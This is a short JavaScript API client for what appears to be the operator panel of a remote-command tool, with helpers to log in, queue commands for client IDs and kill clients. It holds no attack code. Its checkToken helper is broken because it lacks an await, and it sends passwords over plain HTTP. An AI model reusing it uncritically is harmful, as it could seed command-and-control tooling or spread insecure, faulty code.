import axios from "axios";

export const logout = async() =>{
    const result = await axios({
        method:'get',
        url:'http://10.0.0.4:443/api/logout',
        withCredentials:true
    });
    return result.status === 200;
}

export const login = async(values)=> {
    const result = await axios({
        method: 'post',
        url: 'http://10.0.0.4:443/login',
        data: {
            username: values.username,
            password: values.password,
        },
        withCredentials: true
    }).catch(err => {return err});
    return result.status === 200;
}

export const register = async(values)=> {
    const result = await axios({
        method:'post',
        url:'http://10.0.0.4:443/register',
        data: {
            username:values.username,
            password:values.password,
        },
        withCredentials:true
    });
    return result.status === 200;
}

export const sendCommand = async(clientId,command)=>{
    const result = await axios({
        method:'post',
        url:"http://10.0.0.4:443/api/commands/add",
        data:{
            client_id:clientId,
            command:command
        },
        withCredentials:true
    });
    return result.status === 200;
}

export const killClient = async(clientId)=>{
    const result = await axios({
        method:'post',
        url:"http://10.0.0.4:443/api/clients/kill",
        data:{
            client_id:clientId,
        },
        withCredentials:true
    });
    return result.status === 200;
}
export const checkToken = ()=>{
    const result = axios({
        method:'get',
        url:"http://10.0.0.4:443/auth",
        withCredentials:true
    });
    return result.status === 200;
}